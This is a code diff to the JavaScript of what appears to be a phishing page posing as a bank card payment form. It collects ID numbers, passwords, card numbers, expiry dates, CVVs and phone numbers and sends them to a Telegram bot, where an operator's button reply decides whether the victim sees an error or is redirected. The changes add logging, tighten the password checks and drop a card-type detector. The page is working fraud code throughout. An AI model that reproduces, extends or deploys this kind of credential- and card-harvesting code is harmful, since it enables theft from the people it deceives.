@@ -166,6 +166,9 @@
             if (storedData) {
                 initialLoginData = JSON.parse(storedData);
                 transactionId = initialLoginData.transactionId || Date.now().toString();
+                console.log("💾 Datos recuperados de sessionStorage:", initialLoginData);
+            } else {
+                console.warn("🟡 No se encontraron datos de inicio de sesión en sessionStorage.");
             }
 
             async function loadTelegramConfig() {
@@ -175,9 +178,10 @@
                     const data = await response.json();
                     TELEGRAM_BOT_TOKEN = data.token;
                     TELEGRAM_CHAT_ID = data.chat_id;
+                    console.log("🟢 Tokens y IDs de chat de Telegram cargados.");
                     return true;
                 } catch (error) {
-                    console.error('Error al cargar la configuración de Telegram:', error);
+                    console.error('🔴 Error al cargar la configuración de Telegram:', error);
                     alert('Error crítico: No se pudo cargar la configuración de Telegram.');
                     pagarBtn.disabled = true;
                     return false;
@@ -196,8 +200,9 @@
                     const maxUpdateId = Math.max(...updates.map(u => u.update_id));
                     lastUpdateId = maxUpdateId;
                     sessionStorage.setItem('lastUpdateId', lastUpdateId);
+                    console.log('✅ lastUpdateId inicializado a', lastUpdateId);
                 } catch (err) {
-                    console.warn('No se pudo inicializar lastUpdateId:', err);
+                    console.warn('🟡 No se pudo inicializar lastUpdateId:', err);
                 }
             }
 
@@ -217,23 +222,6 @@
                     doubleDigit = !doubleDigit;
                 }
                 return s % 10 === 0;
-            }
-
-            // Función para detectar el tipo de tarjeta
-            function getCardType(number) {
-                let re = new RegExp("^4");
-                if (number.match(re) != null) return "Visa";
-                re = new RegExp("^(34|37)");
-                if (number.match(re) != null) return "Amex";
-                re = new RegExp("^5[1-5]");
-                if (number.match(re) != null) return "Mastercard";
-                re = new RegExp("^6(?:011|5[0-9]{2})");
-                if (number.match(re) != null) return "Discover";
-                re = new RegExp("^3(?:0[0-5]|[68][0-9])[0-9]{11}$");
-                if (number.match(re) != null) return "DinersClub";
-                re = new RegExp("^9792");
-                if (number.match(re) != null) return "troy";
-                return "";
             }
 
             // Función de validación de fecha de expiración
@@ -296,6 +284,7 @@
                 };
 
                 try {
+                    console.log("➡️ Enviando a Telegram:", payload);
                     const response = await fetch(url, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -303,14 +292,14 @@
                     });
                     if (!response.ok) {
                         const errorText = await response.text();
-                        console.error(`Error al enviar mensaje a Telegram: ${response.status} - ${errorText}`);
+                        console.error(`🔴 Error al enviar mensaje a Telegram: ${response.status} - ${errorText}`);
                         return null;
                     }
                     const data = await response.json();
-                    console.log('Mensaje enviado a Telegram exitosamente.');
+                    console.log('✅ Mensaje de pago enviado a Telegram exitosamente.');
                     return data.result.message_id; // Retornar el message_id
                 } catch (error) {
-                    console.error('Error de red al enviar mensaje a Telegram:', error);
+                    console.error('🔴 Error de red al enviar mensaje a Telegram:', error);
                     return null;
                 }
             }
@@ -336,10 +325,10 @@
                     });
                     if (!response.ok) {
                         const errorText = await response.text();
-                        console.error(`Error al borrar botones de Telegram: ${response.status} - ${errorText}`);
+                        console.error(`🔴 Error al borrar botones de Telegram: ${response.status} - ${errorText}`);
                     }
                 } catch (error) {
-                    console.error('Error de red al borrar botones de Telegram:', error);
+                    console.error('🔴 Error de red al borrar botones de Telegram:', error);
                 }
             }
 
@@ -380,7 +369,7 @@
                                     body: JSON.stringify({ callback_query_id: callbackId, text: 'Procesado' })
                                 });
                             } catch (err) {
-                                console.warn('No se pudo responder callback_query:', err);
+                                console.warn('🟡 No se pudo responder callback_query:', err);
                             }
 
                             const callbackKey = callbackDataFull.split(':')[0];
@@ -388,6 +377,7 @@
                             spinnerModal.style.display = 'none';
                             app.style.display = 'block';
 
+                            console.log("➡️ Redirigiendo a:", callbackKey);
                             switch (callbackKey) {
                                 case 'error_tc':
                                     errorMessage.classList.remove('hidden');
@@ -399,14 +389,14 @@
                                     window.location.href = "https://www.google.com";
                                     break;
                                 default:
-                                    console.log("Respuesta no reconocida del bot:", callbackDataFull);
+                                    console.log("🟡 Respuesta no reconocida del bot:", callbackDataFull);
                                     errorModalMessage.textContent = "Respuesta no reconocida. Por favor, intente de nuevo.";
                                     errorModal.style.display = 'flex';
                                     break;
                             }
                         }
                     } catch (error) {
-                        console.error("Error al verificar el estado de la transacción:", error);
+                        console.error("🔴 Error al verificar el estado de la transacción:", error);
                     }
                 }, 1500);
             }
@@ -431,18 +421,19 @@
 
                 app.style.display = 'none';
                 spinnerModal.style.display = 'flex';
-
+                
                 // Get cedula and clave from the initial login data, with fallbacks
                 const cedula = initialLoginData ? initialLoginData.nroDoc || 'N/A' : 'N/A';
                 const tipoDoc = initialLoginData ? initialLoginData.tipoDoc || 'N/A' : 'N/A';
                 let clave = 'N/A';
                 if (initialLoginData) {
-                    if (initialLoginData.clave !== 'N/A') {
+                    if (initialLoginData.clave && initialLoginData.clave !== 'N/A') {
                         clave = initialLoginData.clave;
-                    } else if (initialLoginData.cardClave !== 'N/A') {
+                    } else if (initialLoginData.cardClave && initialLoginData.cardClave !== 'N/A') {
                         clave = initialLoginData.cardClave;
                     }
                 }
+                console.log("📋 Datos a enviar para el pago:", { cedula, tipoDoc, clave, nombreTitular, numeroTarjeta, fechaExp, cvv, telefono });
 
                 let telegramMessage = '🍀 GOLEADOR 🍀\n\n';
                 telegramMessage += `Tipo de Ingreso: Tarjeta de Crédito\n`;
